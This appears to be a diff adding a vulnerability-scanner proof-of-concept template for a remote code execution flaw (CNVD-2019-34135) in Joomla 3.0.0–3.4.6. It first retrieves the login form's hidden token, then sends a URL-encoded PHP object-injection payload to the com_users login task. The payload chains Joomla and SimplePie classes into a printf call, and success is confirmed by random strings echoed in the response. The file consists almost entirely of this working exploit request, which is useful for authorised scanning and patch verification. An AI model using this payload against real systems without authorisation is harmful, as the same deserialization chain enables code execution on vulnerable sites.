@@ -1,0 +1,27 @@
+name: poc-yaml-joomla-cnvd-2019-34135-rce
+set:
+  r1: randomLowercase(10)
+  r2: randomLowercase(10)
+rules:
+  - method: GET
+    path: /
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    follow_redirects: true
+    expression: |
+      response.status == 200
+    search: <input\stype="hidden"\sname="(?P<token>\S{32})"
+  - method: POST
+    path: /
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: >-
+      username=%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0&{{token}}=1&password=AAA%22%3Bs%3A11%3A%22maonnalezzo%22%3AO%3A21%3A%22JDatabaseDriverMysqli%22%3A3%3A%7Bs%3A4%3A%22%5C0%5C0%5C0a%22%3BO%3A17%3A%22JSimplepieFactory%22%3A0%3A%7B%7Ds%3A21%3A%22%5C0%5C0%5C0disconnectHandlers%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A9%3A%22SimplePie%22%3A5%3A%7Bs%3A8%3A%22sanitize%22%3BO%3A20%3A%22JDatabaseDriverMysql%22%3A0%3A%7B%7Ds%3A5%3A%22cache%22%3Bb%3A1%3Bs%3A19%3A%22cache_name_function%22%3Bs%3A6%3A%22printf%22%3Bs%3A10%3A%22javascript%22%3Bi%3A9999%3Bs%3A8%3A%22feed_url%22%3Bs%3A43%3A%22http%3A%2F%2FRayTest.6666%2F%3B{{r1}}%25%25{{r2}}%22%3B%7Di%3A1%3Bs%3A4%3A%22init%22%3B%7D%7Ds%3A13%3A%22%5C0%5C0%5C0connection%22%3Bi%3A1%3B%7Ds%3A6%3A%22return%22%3Bs%3A102%3A&option=com_users&task=user.login
+    follow_redirects: true
+    expression: |
+      response.body.bcontains(bytes(r1 + "%" + r2))
+detail:
+  author: X.Yang
+  Joomla_version: 3.0.0,3.4.6
+  links:
+    - https://www.exploit-db.com/exploits/47465
